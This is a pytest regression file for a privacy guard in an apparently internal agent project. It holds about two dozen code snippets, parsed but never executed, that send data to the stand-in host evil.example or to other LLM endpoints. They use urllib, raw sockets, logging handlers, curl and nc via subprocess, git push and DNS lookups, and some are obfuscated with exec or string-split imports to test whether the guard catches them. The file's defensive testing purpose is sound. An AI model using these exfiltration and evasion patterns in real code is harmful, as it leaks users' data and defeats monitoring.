"""REVIEW-PRIVACY P1 (regression form): snippets that open a network connection / run a fetcher from a guarded directory. When first
written (17:30 GMT) the guard missed all 20 of them; after the PRIVACY track's netscan hardening every case below must be FLAGGED.
A case that goes silent again is a regression. No network is used: the snippets are parsed, never executed.
Run:  UNDERSTUDY_MOCK=1 .venv/bin/python -m pytest evals/review/privacy/test_p1_guard_bypass.py -q -s
"""
from __future__ import annotations

import pytest

from understudy_engine.privacy import guard

BYPASS_GUARDED_DIR = {
    # name -> source placed at calendar/x.py (a GUARDED dir, no ALLOW entry)
    "import_urllib_then_urllib_request": "import urllib\nurllib.request.urlopen('https://evil.example/x?d=' + data)\n",
    "from_urllib_import_request": "from urllib import request\nrequest.urlopen('https://evil.example/x')\n",
    "from_http_import_client": "from http import client\nc = client.HTTPSConnection('evil.example')\nc.request('POST','/',body=data)\n",
    "asyncio_open_connection": "import asyncio\nasync def f(d):\n    r, w = await asyncio.open_connection('evil.example', 443)\n    w.write(d)\n",
    "webbrowser_open_leaks_in_url": "import webbrowser\nwebbrowser.open('https://evil.example/?q=' + data)\n",
    "logging_http_handler": "import logging.handlers\nh = logging.handlers.HTTPHandler('evil.example', '/log', method='POST')\n",
    "logging_socket_handler": "import logging.handlers\nh = logging.handlers.SocketHandler('evil.example', 9999)\n",
    "multiprocessing_connection": "from multiprocessing.connection import Client\nc = Client(('evil.example', 6000))\nc.send(data)\n",
    "curl_by_absolute_path": "import subprocess\nsubprocess.run(['/usr/bin/curl', '-d', data, 'https://evil.example'])\n",
    "curl_string_built": "import subprocess\nsubprocess.run('c' + 'url -d ' + data + ' https://evil.example', shell=True)\n",
    "nc_ssh_scp_osascript": "import subprocess\nsubprocess.run(['nc', 'evil.example', '9'], input=data)\n",
    "mac_open_url": "import subprocess\nsubprocess.run(['open', 'https://evil.example/?d=' + data])\n",
    "python_dash_c_child": "import subprocess, sys\nsubprocess.run([sys.executable, '-c', 'import urllib.request as u; u.urlopen(\"https://evil.example\")'])\n",
    "git_push_via_subprocess": "import subprocess\nsubprocess.run(['git', 'push', 'https://evil.example/r.git', 'HEAD'])\n",
    "getattr_on_importlib_variable_name": "import importlib\nname = 'op' + 'enai'\nm = importlib.import_module(name)\n",
    "builtin_dunder_import_alias": "import builtins\nm = getattr(builtins, '__imp' + 'ort__')('httpx')\n",
    "exec_string": "exec('import ' + 'httpx; httpx.post(\"https://evil.example\", content=d)')\n",
    "port_in_variable_named_x": "def f(x):\n    return x.plan([{'role':'user','content':raw}], None)\n",
    "port_via_getattr": "def f(p):\n    return getattr(p, 'plan')([{'role':'user','content':raw}], None)\n",
    "ctypes_libc_connect": "import ctypes\nctypes.CDLL(None).connect\n",
    "dns_exfil_gethostbyname": "import socket as s\ns.gethostbyname(data + '.evil.example')\n",  # socket IS flagged: control case
}


@pytest.mark.parametrize("name", sorted(BYPASS_GUARDED_DIR))
def test_guarded_dir_snippet(name):
    viol, _ = guard.scan_source(BYPASS_GUARDED_DIR[name], "calendar/x.py")
    if name == "dns_exfil_gethostbyname":
        assert viol, "control: `import socket as s` must be flagged"
        return
    assert viol, f"{name}: the guard is silent about this snippet (regression)"


# Agent side: modules under services/agent outside runtime/ (voice/, tiers/, handoff_io.py, server.py ...). They are covered by guard.scan_agent_source.
BYPASS_AGENT_SIDE = {
    "httpx_post_to_any_host_outside_runtime": ("understudy_agent/tiers/x.py", "import httpx\nhttpx.post('https://evil.example/c', content=data)\n"),
    "requests_in_agent_voice": ("understudy_agent/voice/x.py", "import requests\nrequests.post('https://evil.example', data=data)\n"),
    "other_llm_host_openrouter": ("understudy_agent/tiers/x.py", "import httpx\nhttpx.post('https://openrouter.ai/api/v1/chat/completions', json={})\n"),
    "other_llm_host_via_env": ("understudy_agent/tiers/x.py", "import os, httpx\nhttpx.post(os.environ['LLM_URL'], json={'p': data})\n"),
    # an ALLOW-LISTED file (it may use httpx) must still not name another host or build the URL from the environment
    "allowed_file_names_a_foreign_host": ("understudy_agent/server.py", "import httpx\nhttpx.post('https://evil.example/c', content=data)\n"),
    "allowed_file_url_from_env": ("understudy_agent/handoff_io.py", "import os, httpx\nhttpx.post(os.environ['X'], content=data)\n"),
}


@pytest.mark.parametrize("name", sorted(BYPASS_AGENT_SIDE))
def test_agent_side_snippet(name):
    rel, src = BYPASS_AGENT_SIDE[name]
    viol, _ = guard.scan_agent_source(src, rel)
    assert viol, f"{name}: silent (regression)"


def test_every_agent_module_that_imports_a_network_client_is_under_the_scan():
    import re
    rep = guard.scan_agent()
    scanned = set(rep.files)
    root = guard.AGENT_PKG
    missed = []
    for p in sorted(root.rglob("*.py")):
        rel = p.relative_to(root).as_posix()
        if rel.startswith(("runtime/", "models/")) or "__pycache__" in rel:
            continue
        if re.search(r"^\s*(import|from)\s+(httpx|requests|urllib\.request|socket|websockets|aiohttp)\b", p.read_text(encoding="utf-8"), re.M):
            if not any(f.endswith(rel) for f in scanned):
                missed.append(rel)
    assert not missed, f"agent modules with a network import that scan_agent() does not cover: {missed}"
